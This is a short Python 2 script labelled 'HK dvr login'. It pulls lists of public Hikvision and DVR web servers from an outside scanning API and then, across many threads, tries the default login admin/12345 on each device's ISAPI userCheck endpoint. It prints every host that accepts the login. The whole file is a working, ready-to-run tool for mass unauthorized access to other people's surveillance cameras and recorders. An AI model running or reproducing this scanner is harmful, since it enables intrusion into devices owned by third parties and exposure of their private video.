#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com
# last modify time 2016-07-15
# python check.py 50 

import threading
import requests
import Queue
import sys
import re

#main function
def bThread(iplist):

    threadl = []
    queue = Queue.Queue()
    for host in iplist:
        queue.put(host)

    for x in xrange(0, int(sys.argv[1])):
        threadl.append(tThread(queue))

    for t in threadl:
        t.start()
    for t in threadl:
        t.join()

#create thread
class tThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):

        while not self.queue.empty():
            host = self.queue.get()
            try:
                getinfo(host)
            except:
                continue

def getinfo(host):

    username = "admin"
    password = "12345"
    timeout = 5

    try:
        req = requests.get(url='http://'+ username +':'+ password +'@'+ host +'/ISAPI/Security/userCheck',timeout = timeout)
        result = req.text
        status = re.findall(r'<statusValue>(.*)</statusValue>', result)
        if status[0] == '200':
            print 'Host http://'+ host +' Login Success!'
    except:
        pass

if __name__ == '__main__':
    print '\n*************** HK dvr login ****************'
    print '              Author 92ez.com'
    print '       You should know what U R doing!'
    print '*********************************************\n'

    req1 = requests.get('http://api.telnetscan.org/header/select.php?s=DNVRS-Webs')
    content1 = req1.content
    req2 = requests.get('http://api.telnetscan.org/header/select.php?s=Hikvision-Webs')
    content2 = req2.content
    req3 = requests.get('http://api.telnetscan.org/header/select.php?s=App-webs/')
    content3 = req3.content

    content = content1+content2+content3
    iplist = re.findall(r'href="http://(.+?)">',content)

    print '\n[Note] Total '+str(len(iplist))+" items..."
    print '[Note] Running...\n'

    try:
        bThread(iplist)
    except KeyboardInterrupt:
        print 'Keyboard Interrupt!'
        sys.exit()